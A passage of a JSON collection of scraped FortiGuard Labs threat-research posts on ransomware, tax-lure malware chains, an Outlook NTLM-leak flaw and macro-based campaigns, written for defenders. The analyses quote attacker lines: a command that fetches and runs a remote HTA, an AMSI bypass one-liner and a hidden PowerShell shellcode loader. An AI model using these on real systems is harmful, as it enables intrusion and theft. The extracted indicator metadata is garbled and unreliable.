45[.]87[.]81[.]184193[.]42[.]33[.]232 352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d attack research,email phishing,infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer",
      "scraped_at": "2025-07-20T13:57:36.100623",
      "indicators": {
        "ip_address": [],
        "domain": [
          "za",
          "K2023",
          "redentials",
          "zyy",
          "onfirm",
          "nMs",
          "ontain"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "http://193"
        ]
      },
      "threat_score": 0.387972841901067
    }
  },
  {
    "id": "Fortinet_11267",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Kadavro Vector Ransomware",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Kadavro Vector ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a ransomware named “Kadavro Vector”, a NoCry ransomware variant that encrypts files on compromised machines and demands a ransom in Monero (XMR) cryptocurrency for file decryption. Recent variants of the Kadavro Vector ransomware are distributed as a fake Tor browser installer and include a Tor browser icon named “torbrowser-install-win64-12.0.4_ALL.exe”. Once the Kadavro Vector ransomware is executed, it encrypts files on compromised machines and appends a “.vector_” extension to them. The Kadavro Vector ransomware then drops an interactive ransom note on the victim’s desktop and demands $250 worth of Monero for file decryption. Although the ransom note is available in English and Russian in the screenshot below, scrolling down the left pane reveals it is also available in Norwegian. This likely means that the attacker is primarily targeting regions where those languages are used. To date, public submissions of Kadavro Vector ransomware samples have been made from the U. S., Russia, and Kazakhstan. Clicking “Show Encrypted Files” creates a pop-up window with a list of the files the ransomware has encrypted, likely to add pressure on victims by showing the number of affected files that will not be recovered unless a ransom is paid. Another pop-up window with the attacker’s email address is displayed upon clicking “Contact Us”. Victims are given four attempts to correctly enter a decryption key that is supposedly provided after the ransom is paid. The decryption screen warns that the encrypted files will be lost after four attempts. Based on traits found in the recent Kadavro Vector ransomware, we were able to trace it back to an older variant (SHA2: b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182) from early 2023, which may be the initial variant that calls itself “Kadavro”. The older Kadavro Vector variant encrypts files (including itself) on compromised machines, just like in recent samples. This older variant appends a “.tor” extension instead of the “.vector_” extension used by current variants. b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182 also replaces the desktop wallpaper. While we did not observe the Kadavro ransomware dropping a ransom note in our testing, it is visible in its code. The ransom note references “Anon Vector”, which is likely another ransomware that the threat actor previously used or at least tried to use. We also discovered another ransomware called “Kadavro” (SHA2: b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533) that was submitted to a public submission portal a week earlier. Since both Kadavro samples were submitted from the U. S. and Russia, and the submission dates are close, the same threat actor may be involved. The ransom note dropped by b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533 is available only in English and demands $160 worth of Monero from victims for file decryption. Furthermore, one of the recent Kadavro Vector samples refers to a Pastebin page for a ngrok address. \"ngrok” is a legitimate easy-to-usereverse proxy toolthat allows developers to expose local services to the internet. Unfortunately, threat actors often abuse ngrok’s tunneling capabilities for Command-and-Control (C2) communication. Based on the Pastebin page address, we found other malware potentially used by the same threat actor. Some of the samples are XWorm, a Remote Access Trojan (RAT) with ransomware capabilities. This may indicate that the Kadavro Vector ransomware threat actor tried other malware that supports file encryption. The Kadavro Vector ransomware variants described in this report are detected and blocked by FortiGuard Antivirus as: Other malware potentially used by the same threat actor are detected with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are protected. File-based IOCs: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware today is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-kadavro-vector-ransomware",
      "scraped_at": "2025-07-20T13:57:44.965260",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182",
          "b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5044247787610621
    }
  },
  {
    "id": "Fortinet_96135",
    "source": "Fortinet",
    "title": "Deja Vu All Over Again: Tax Scammers at Large",
    "text": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc. Severity Level:Medium The time has come again for tax returns—and tax-based scams. Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. This blog covers a few examples of malware that take advantage of tax season. Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed. The zip file contains the following files: The XLSX file is a benign decoy file that contains financial data from an unknown source. The other file is malicious. Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems. The file is actually a link (LNK) file that launches the legitimate script (C:\\Windows\\System32\\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments. The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\\W_\\*2\\\\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.'+'hta') The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation. Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. note.gif is a PowerShell script that creates the following files: Once launched, it executes the onedrive.vbs and test.vbs files. test.vbs creates %usertemp%\\Note.txt, a clean file containing fake \"QUARTERLY TAX PAYMENTS FOR 2022\" data. onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender. It first executes the following known AMSI (Antimalware Scripting Interface) bypass: [Ref]. Assembly. GetType(‘System. Management. Automation. AmsiUtils’) . GetField(‘amsiInitFailed’,’NonPublic,Static’). SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\". The PowerShell script then performs the following actions to alter Windows Defender settings: The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. Furthermore, we discovered other files that follow a similar attack pattern; “Mary tax docs.pdf.lnk” (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and “Wilson tax_docs.pdf.lnk” (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023. As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. “Mary tax docs.pdf.lnk”, along with another clean Microsoft Office file, “R&P Sales Summary.docx”, are included in an archived file labeled “2022 tax docs.zip”. Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”. The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”. While the “a.mp3” is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim’s machine. From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150. XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC). XWorm can also encrypt files, essentially acting in a similar fashion to ransomware. Here are screenshots of a recently cracked version of XWorm v3.1: Going back to the first example, “2022%20tax_documents[.]zip”, we found that it was hosted on the open directory “www[.]farmaciasmv[.]com/citrix/”. We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html. The files involved in this attack were submitted to VirusTotal. We don’t believe victims just wander into such malicious sites by accident. Based on our experience, they were likely lured via malicious links in spam emails. Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run. The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. Another tax-related attack FortiGuard Labs came across is an image file named “TaxReturn2022.img” (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: We were able to locate another file, “TaxReturns2022.iso” (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files. Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted. As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon. However, it’s a link (shortcut) file, as seen in Figure 4. Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1). The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code. It eventually runs: powershell.exe -ExecutionPolicy UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded. In this case, it downloads “TaxReturn2022.pdf” from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\\TaxReturn2022.pdf, and opens it. Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open. The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo = [location of downloaded PDF file] This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs. The script then sleeps five seconds before downloading and executing whatever has been downloaded. In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d). Note that part of the IP address masked as the directory is accessible. TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07). no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1. The .ps1 file contains two PE files (stored in $apprun and $appme). It uses 'C:\\Windows\\Microsoft. NET\\Framework\\v4.0.30319\\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2). This link file goes through the same infection chain as the previous one: qDxcmqPPmI.wsf was not available at the time of the investigation. However, OSINT led us to find the next action. Curiously the attacker left the hosting location of the malicious files wide open. The directory contains a few files whose names are associated with Adobe Acrobat Reader DC. This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes. But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain. A little caution can go a long way toward protecting yourself against tax-related malware. The attacks covered in this blog are the tip of the iceberg. Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks. In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world. For additional information, please refer to the “Tax Scams/Consumer Alerts” alert issued by the IRS for other tips on protecting yourself from tax-related scams. FortiGuard AntiVirusdetects the malicious files identified in this report with the following signatures: The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web Filtering Servicedetects the download URLs cited in this report as Malicious and blocks them. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. tax refund,FortiGuards Labs,taxes,threat actors,remote access trojan Industry Trends FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/tax-scammers-at-large",
      "scraped_at": "2025-07-20T13:57:52.723790",
      "indicators": {
        "ip_address": [],
        "domain": [
          "axReturn2022",
          "ote",
          "DxcmqPPmI",
          "o",
          "msi",
          "ed",
          "nedrive",
          "SHTA",
          "est",
          "ummary",
          "CywxTOvZk",
          "oc",
          "axReturns2022",
          "egSvcs",
          "df",
          "owershell",
          "ocs",
          "yncAppvPublishingServer",
          "DontExist",
          "icrosoft"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07",
          "6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0",
          "0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715",
          "351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d",
          "c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b",
          "bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6",
          "c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e",
          "6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe",
          "460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c",
          "ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2",
          "0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6060606060606061
    }
  },
  {
    "id": "Fortinet_25009",
    "source": "Fortinet",
    "title": "Exploring a Recent Microsoft Outlook Vulnerability: CVE-2023-23397",
    "text": "FortiGuard Labs Threat Research FortiGuard Labsrecently investigated an Elevation of Privilege vulnerability in Microsoft Outlook that can be exploited by sending a crafted email to a vulnerable version of the software. When the victim receives the email, an attempt to connect to an attacker’s device is triggered, resulting in the victim’s NTLMv2 hash being leaked. The vulnerable property resides in the PidLidReminderFileParameter extended MAPI property, which specifies the filename of a sound to be played when a reminder for an object is overdue. To trigger the vulnerability, the sender simply modifies the PidLidReminderFileParameter message property to point to a malicious UNC path in a calendar or task item invite. To replicate this vulnerability, we used the Outlook AppointmentItem object to customize a malicious appointment email in the Calendar folder. No interaction from the recipient is required. Upon receipt of the email, an automatic reminder pop-up appears on the recipient’s device that triggers NTLM authentication behind the scenes. A request to access the UNC path via SMB to an untrusted network is initiated. To obtain the NTLMv2 hash of the recipient during authentication, a MitM (Man in the Middle) attack can be set up to concurrently listen to and poison incoming requests. Using NTLM authentication, a bad actor can then use the exposed hashes to elevate their privileges in other systems, potentially gaining control of services unbeknownst to the email recipient. Microsoft has released ascriptthat checks for the presence of the PidLidReminderFileParameter message property in Exchange messaging items. This script provides the option to sanitize or fully remove items containing the vulnerable parameter. Microsoft has also released anadvisoryfor CVE-2023-23397 outlining the latest security updates. All users with a vulnerable version of Microsoft Outlook are encouraged to patch their systems immediately. FortiGuard AntiVirusdetects the malicious files identified in this report as: FortiGuard IPSprotects organizations with the following signature: The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient,FortiEDR,andFortiProxy. The FortiGuard IPS service is supported byFortiGate. Customers running up-to-date versions of these products are protected. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. This threat is delivered as an email attachment. FortiMailandFortiSandboxcan detect and quarantine malicious attachments for such campaigns. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. vulnerabilities,cve,outlook FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/exploring-recent-microsoft-outlook-vulnerability-cve-2023-23397",
      "scraped_at": "2025-07-20T13:58:01.936145",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-23397"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.21226415094339623
    }
  },
  {
    "id": "Fortinet_94340",
    "source": "Fortinet",
    "title": "Are Internet Macros Dead or Alive?",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Potential to deploy additional malware for additional purposesSeverity level:Medium In early February of 2022,Microsoft announcedthat Internet Macros would be blocked by default to improve the security of Microsoft Office. According to their blogpublished in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023. Office uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro. Since that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads. The most common method employed by several cybercrime and nation-state actors is using ISO image files that usually contain a .lnk file and a dll payload to distribute their malware. In this method, the victim must execute the .lnk file, which leads to executing the dll file – commonly either a malicious payload or a downloader that grabs the next-stage payload. These ISO images are either directly attached to a spam/phishing email or have been dropped using other methods, like html smuggling, in which an html file is attached to the spam/phishing email, and by opening it, a malicious ISO file is dropped in the victim’s machine. We covered these techniques in blogs last year,hereandhere. Even though several cyber threat actors have adopted TTPs to not use Office macros, we have observed several threat actors still relying on Office macros to initiate their attacks. In this blog post, we provide an overview of some of the interesting Office macro-embedded documents we observed early this year (some of these activities have already been reported on by security researchers on Twitter). It is worth mentioning that while some of the threat actors had multiple activities, we only cover one of them as an example in the post. But we added all the related IOCs in the IOC (Indicator of Compromise) section at the end of this blog. Emotet is a modular malware launched into the wild around 2014, operating as a banking malware in an organized botnet. But nowadays, Emotet mainly operates as a downloader for additional payloads such as IcedId, eventually deploying ransomware. Emotet has adopted .lnk files as one of its distribution methods, using this method in mid-2022. OnMarch 7of this year, Emotet is back in operation, and this time the actor is using malicious documents to spread Emotet. In this new campaign, malicious documents weaponized with macros are embedded in an archive file and used as attachments in spam emails. The lure they use is well-known, having been employed by these threat actors in their previous campaigns. This is not the only template used in this campaign. We also observed that the actor had used another template to distribute Emotet. All the URLs, strings, and file names are encoded in the macro. It also includes a decoder function to decode these strings. The decoder function receives three arguments: a hardcoded string, an array of numbers that are populated before calling the decoder function, and a size. The function has a loop with the provided size, and it uses a Mid function each time to find the proper character from the hardcoded string and append them together to build the string. The array of numbers shows which character needs to be selected. All function executions are performed by the CallByName function. This function executes a method of an object. The macro first decodes all the encoded URLs and then creates a file name to store the Emotet payload. The file name is also decoded, which is the machine's current time. For example, if the time is 12:25:23, the file name will be 122523.tmp. It then builds the required parameters for each URL and makes the HTTP request to get the Emotet payload. More specifically, it adds the current time (in the format used to create the .tmp file name) and a parameter to the end of the URL (usually, c=1). It performs the HTTP requests and checks on the status till it receives ‘200’, which means the server has responded. It then downloads the response body, which is a zip file, and saves it into the victim’s machine in the same location as the Word document is located. After that, it extracts the zip file and moves the contents of the archive file into that tmp file, whose name was created in the previous step. It then deletes both the zip file and the extracted directory. In the last step, it calls RegSvr32.exe to execute the payload. Gozi ISFB, also known as Ursnif, is a banking trojan that has been distributed through spam campaigns, exploit kits, and fake pages. Recently, this trojan has been distributed using various methods, such as .hta and .lnk files, but this trojan is also still being distributed using macro-based Excel documents. In a recent spam campaign onMarch 9th,they used archive files containing macro-embedded Excel files as attachments to spam emails to target users in Italy. The Excel document contains a macro that downloads and executes the Gozi payload. Enabling macros won’t activate the download execution since the primary function is executed when the end user clicks the “APRI (Open)” button. Clicking this button executes the “beneficiary” function. This function is simple. As you can see below, the download URL is encoded within the macro but has some numbers between each character. It then uses UrlDownloadToFileA to download the payload and save it into a .cvs file in the Document directory. It then uses the VBA. Shell function to execute the downloaded dll using rundll32. It also clears the cache of Internet Explorer using the Shell command. Donot APT, also known as APT-C-35 and SectorE02, is a threat actor targeting organizations and individuals in South Asia – specifically, Bangladesh, Sri Lanka, Pakistan, and Nepal – since at least 2016. This actor relies on spear-phishing emails weaponized with malicious documents to target its victims. We have observed that the group still uses malicious documents to target its victims. We observed some maldocs being used by this actor in early 2023, and in this section, we will look at the most recent campaign run by this actor. Most of the maldocs we observed have a creation time of around 2021, but all were connected to domains created in the past 30 days. This suggests that the threat actor has reused maldocs previously made by them in their Feb and March 2023 campaign. The embedded macro uses a combination of lesser-known APIs to inject a shellcode inside the memory of the Microsoft Office: NtAllocateVitualMemory, WideCharToMulitBytes, and Internal_EnumUILanguages. The Internal_EnumUIlanguages API is used as a callback to execute the shellcode. These API calls bypass blacklist detections that detect known functions in VBA, such as Shell and Run functions. The injected shellcode connects to its C2s to get the next-stage payload. It also creates a scheduled task to make connections to its C2. Besides what we analyzed here, we have also seen a malicious Word document used by this actor sometime around Jan 17thof this year. Confucius is a threat actor primarily operating cyberespionage campaigns against Pakistan since 2013. This threat actor has used macro-based documents in its past campaigns and is still using the same method to initiate its current attacks. In one of their most recent operations, run in February of this year, they used macro-based documents to target the financial division of the government of Pakistan. The macro drops a text file into thePublic/Picturesdirectory and then creates a scheduled task service to execute the text file at a specific time. In fact, the dropped txt file is a shellcode that will be executed by calling PowerShell. powershell. EXE -w hidden iex([System. Text. Encoding]::ASCII). GetString((([string](get-content -path C:\\Users\\Public\\Pictures\\walpaper.jpeg.txt)).replace(' ','')).split(',')) SideCopy is a Pakistani threat actor primarily targeting India since at least 2019. The actor has used multiple methods. such as .lnk files, macro-based documents, and trojanized applications to initiate its attacks. In one of their most recent operations, they still used macro-embedded word documents to target the government of India. The macro is simple. Its execution starts when a user closes the document. It connects to its server to download the content of a payload in text format, which it then converts to an executable and stores in the Startup directory to be executed after a machine reboot. On March 1st, we identified a new malicious document that might have targeted Vietnamese users. The malicious document was weaponized with a macro, yet another example of threat actors that still rely on macro-embedded documents to initiate their attacks. The embedded macro drops an archive file that contains all the malicious files needed in this attack. The archive file contains batch scripts, PowerShell scripts, and dll files. In the next step, it moves its archive file into the APPDATA/Microsoft directory and unzips it. The dlls embedded within the archive file perform the primary malicious activities. The macro is only responsible for loading the right dll file according to the OS version and then calling its export function. The dll file is responsible for creating three scheduled tasks (Script_Update, Windows_Executor, Windows_Update) and executing them at specific time intervals. Each scheduled task executes one of the scripts embedded within the archive file. We also found another document associated with this actor that was uploaded to VirusTotal in December 2022. This may indicate that the actor has been active over the past few months. Besides what we have reported in the previous sections, we have also observed other actors still using macro-based documents to target their victims. Here are some of them: - Kimsuky used a macro-based document to target Korean-speaking people. The maldoc deploys Quasar Rat. - A threat actor targeted defense production factories in Pakistan in early February of this year. The actor used a macro-embedded Excel file to distribute its payload. Due to not having enough indicators, we are avoiding attributing this activity to any specific actor. The macro is not obfuscated. It just downloads the payload from the server and stores it in the Startup directory as Notepad.exe. This blog post provided an overview of threat actors still using macro-based Office documents. We showed several APT groups, such as Kimsuky, Donot, and SideCopy, and cyber-crime actors, such as Emotet, still relying on macro-based Office documents to initiate attacks and distribute their payloads. This research shows that although it has been over a year since Microsoft announced its intent to disable Internet macros, numerous threat actors still use those macros to distribute their malware. This suggests that security companies/people still need to be cautious about opening Office documents and update their software to the latest versions that block these macros by default. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: VBA/Valyria.7853!trVBA/Agent. CVE!trVBA/Agent.6412!trVBA/Agent. YSM!trVBA/Agent. AEC!trVBA/Agent. YEU!trVBA/Agent. YVG!trVBA/Emotet. RES!tr Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREE NSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. tactics techniques and procedures (TTP),microsoft FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/are-internet-macros-dead-or-alive",
      "scraped_at": "2025-07-20T13:58:09.762679",
      "indicators": {
        "ip_address": [],
        "domain": [
          "22523",
          "egSvr32",
          "otepad",
          "alpaper"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.31492248062015504
    }
  },
  {
    "id": "Fortinet_77656",
    "source": "Fortinet",
    "title": "Malware Disguised as Document from Ukraine's Energoatom Delivers Havoc Demon Backdoor",
